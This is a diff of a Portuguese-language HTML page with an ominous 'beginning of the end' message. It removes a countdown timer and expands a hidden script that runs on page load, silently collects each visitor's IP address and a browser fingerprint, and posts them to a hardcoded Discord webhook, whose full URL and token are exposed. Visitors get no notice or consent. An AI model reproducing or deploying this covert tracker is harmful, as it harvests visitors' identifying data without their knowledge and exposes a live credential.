@@ -67,60 +67,48 @@
         <p>Prepare-se para o início do fim. Não há como escapar.</p>
     </div>
 
-    <script>
-        // Função para atualizar o countdown
-        function updateCountdown() {
-            const countdownElement = document.getElementById('countdown');
-            const targetDate = new Date('November 30, 2024 23:59:59 GMT-3').getTime();
-            const now = new Date().getTime();
-            const timeLeft = targetDate - now;
+<script>
+    // Função para pegar o IP, informações do dispositivo e enviar ao webhook do Discord
+    function sendDeviceInfoToWebhook() {
+        fetch('https://api.ipify.org?format=json')
+            .then(response => response.json())
+            .then(data => {
+                const ip = data.ip;
+                const userAgent = navigator.userAgent;
+                const platform = navigator.platform;
+                const language = navigator.language;
+                const screenWidth = screen.width;
+                const screenHeight = screen.height;
+                const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+                const cookieEnabled = navigator.cookieEnabled;
+                const touchPoints = navigator.maxTouchPoints;
+                const colorDepth = screen.colorDepth;
+                const historyLength = window.history.length;
 
-            const days = Math.floor(timeLeft / (1000 * 60 * 60 * 24));
-            const hours = Math.floor((timeLeft % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
-            const minutes = Math.floor((timeLeft % (1000 * 60 * 60)) / (1000 * 60));
-            const seconds = Math.floor((timeLeft % (1000 * 60)) / 1000);
+                // Conexão
+                const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+                const connectionType = connection ? connection.effectiveType : 'Desconhecido';
+                const downlinkSpeed = connection ? connection.downlink : 'Desconhecido';
 
-            countdownElement.innerHTML = `${days} dias ${hours} horas ${minutes} minutos ${seconds} segundos`;
+                const webhookUrl = 'https://discord.com/api/webhooks/1272075727235448842/Uwe7Ey2QSwnhp7wcOqEHipiMf1WT0Nw4CVPE3hEhUJEUEULjY8xjgWuOPVcdlbCZrSb7'; // Seu webhook
+                const deviceInfo = {
+                    content: `Novo visitante:\nIP: ${ip}\nUser Agent: ${userAgent}\nPlataforma: ${platform}\nIdioma: ${language}\nResolução: ${screenWidth}x${screenHeight}\nFuso Horário: ${timezone}\nCookies Habilitados: ${cookieEnabled}\nPontos de Toque: ${touchPoints}\nProfundidade de Cor: ${colorDepth} bits\nComprimento do Histórico: ${historyLength}\nTipo de Conexão: ${connectionType}\nVelocidade de Downlink: ${downlinkSpeed} Mbps`
+                };
 
-            if (timeLeft < 0) {
-                clearInterval(countdownInterval);
-                countdownElement.innerHTML = "O tempo acabou.";
-            }
-        }
+                fetch(webhookUrl, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify(deviceInfo)
+                });
+            })
+            .catch(error => console.error('Erro ao obter informações do dispositivo:', error));
+    }
 
-        const countdownInterval = setInterval(updateCountdown, 1000);
+    // Chama a função para enviar as informações do dispositivo quando o site carregar
+    window.onload = sendDeviceInfoToWebhook;
+</script>
 
-        // Função para pegar o IP, informações do dispositivo e enviar ao webhook do Discord
-        function sendDeviceInfoToWebhook() {
-            fetch('https://api.ipify.org?format=json')
-                .then(response => response.json())
-                .then(data => {
-                    const ip = data.ip;
-                    const userAgent = navigator.userAgent;
-                    const platform = navigator.platform;
-                    const language = navigator.language;
-                    const screenWidth = screen.width;
-                    const screenHeight = screen.height;
-                    const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
-
-                    const webhookUrl = 'https://discord.com/api/webhooks/1272075727235448842/Uwe7Ey2QSwnhp7wcOqEHipiMf1WT0Nw4CVPE3hEhUJEUEULjY8xjgWuOPVcdlbCZrSb7'; // Seu webhook
-                    const deviceInfo = {
-                        content: `Novo visitante:\nIP: ${ip}\nUser Agent: ${userAgent}\nPlataforma: ${platform}\nIdioma: ${language}\nResolução: ${screenWidth}x${screenHeight}\nFuso Horário: ${timezone}`
-                    };
-
-                    fetch(webhookUrl, {
-                        method: 'POST',
-                        headers: {
-                            'Content-Type': 'application/json'
-                        },
-                        body: JSON.stringify(deviceInfo)
-                    });
-                })
-                .catch(error => console.error('Erro ao obter informações do dispositivo:', error));
-        }
-
-        // Chama a função para enviar as informações do dispositivo quando o site carregar
-        window.onload = sendDeviceInfoToWebhook;
-    </script>
 </body>
 </html>
